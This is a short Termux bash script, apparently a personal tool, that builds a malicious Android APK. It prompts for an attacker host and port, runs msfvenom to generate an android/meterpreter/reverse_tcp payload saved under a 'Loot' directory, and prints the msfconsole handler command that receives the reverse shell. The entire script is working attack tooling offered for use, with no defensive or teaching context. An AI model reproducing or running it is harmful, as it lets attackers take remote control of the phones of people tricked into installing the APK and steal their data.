#!/data/data/com.termux/files/usr/bin/bash

echo "[+] Android Payload Builder (Lite Edition)"
echo "Example LHOST: 192.168.1.10"
read -p "Enter LHOST: " lhost
read -p "Enter LPORT (default 4444): " lport

lport=${lport:-4444}

mkdir -p ~/Kydras_Loot/payloads
output=~/Kydras_Loot/payloads/android_kydras_payload.apk

echo "[+] Generating payload..."
msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $output

echo "[+] Payload generated: $output"
echo "[+] Recommended listener:"
echo "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; exploit'"
